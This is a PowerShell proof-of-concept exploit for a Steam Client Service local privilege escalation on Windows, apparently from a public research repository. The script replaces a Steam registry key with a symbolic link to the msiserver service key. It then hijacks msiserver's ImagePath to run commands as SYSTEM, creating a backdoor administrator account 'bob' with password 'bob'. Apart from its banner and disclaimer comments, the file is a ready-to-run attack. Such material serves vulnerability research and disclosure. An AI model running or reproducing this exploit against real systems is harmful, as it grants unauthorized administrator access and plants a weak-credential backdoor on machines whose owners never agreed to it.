#Fahrrad.ps1

# This is a privilege escalation exploit for the Steam Client. Uses registry symlinks. Check it out at https://github.com/alexanderbittner/steam-privesc/ .
# 
# This program is only intended for research purposes.
# USE AT YOUR OWN RISK and please don't break anyone's system.
#
# PoC that was useful for developing this: https://gist.github.com/enigma0x3/03f065be011c5980b96855e2741bf302
# credits go to Vasily Kravets @ https://amonitoring.ru/article/steamclient-0day/

import-module NTObjectManager
Write-Host "Deleting reg key HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS"
Remove-Item -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS"

Write-Host "Making reg symlink HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS -> HKLM:\SYSTEM\CurrentControlSet\Services\msiserver"
[NtApiDotNet.NtKey]::CreateSymbolicLink("\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\NSIS",$null, "\REGISTRY\Machine\SYSTEM\CurrentControlSet\Services\msiserver")
Write-Host "[*] Registry Symbolic link created"

#start steam client service
Write-Host "[*] Starting client service..."
Start-Service "Steam Client Service"
Write-Host "[*] Started. Waiting a few seconds..."

Start-Sleep 1
Write-Host ""
Write-Host "                                           `$^   *."
Write-Host "               d`$`$`$`$`$`$`$P^                  `$    J"
Write-Host "                   ^$.                     4r^  "
Write-Host "                   d^b                    .db^"
Write-Host "                  P   $                  e^ $"
Write-Host "         ..ec.. .^     *.              zP   $.zec.."
Write-Host "     .^        3*b.     *.           .P^ .@^4F      ^4"
Write-Host "   .^         d^  ^b.    *c        .`$^  d^   $         %"
Write-Host "  /          P      $.    ^c      d^   @     3r         3"
Write-Host " 4        .eE........$r===e`$`$`$`$eeP    J       *..        b"
Write-Host " $       `$`$`$`$`$       `$   4`$`$`$`$`$`$`$     F       d`$`$`$.      4"
Write-Host " $       `$`$`$`$`$       `$   4`$`$`$`$`$`$`$     L       *`$`$`$^      4"
Write-Host " 4         ^      ^^3P ===`$`$`$`$`$`$^     3                  P"
Write-Host "  *                 `$       ^^^        b                J"
Write-Host "   ^.             .P                    %.             @"
Write-Host "     %.         z*^                      ^%.        .r^"
Write-Host "        ^*==*^^                             ^^*==*^^"
Write-Host ""

Start-Sleep 2
Write-Host "The Fahrrad is ready."
Start-Sleep 1
Write-Host "[!] Setting payload: Adding new user bob"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\msiserver" -Name "ImagePath" -Value "C:\Windows\System32\cmd.exe /c net user /add bob bob"

Start-Sleep 1
#start msiserver
Write-Host "[*] Starting msiserver, this should execute the payload."
Start-Service "msiserver"

Start-Sleep 5
Write-Host "[!] Setting payload: Making bob admin"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\msiserver" -Name "ImagePath" -Value "C:\Windows\System32\cmd.exe /c net localgroup administrators bob /add"

Start-Sleep 1
#start msiserver
Write-Host "[*] Starting msiserver, this should execute the payload."
Start-Service "msiserver"

Write-Host "Successfully added admin user with credentials bob:bob."
net user bob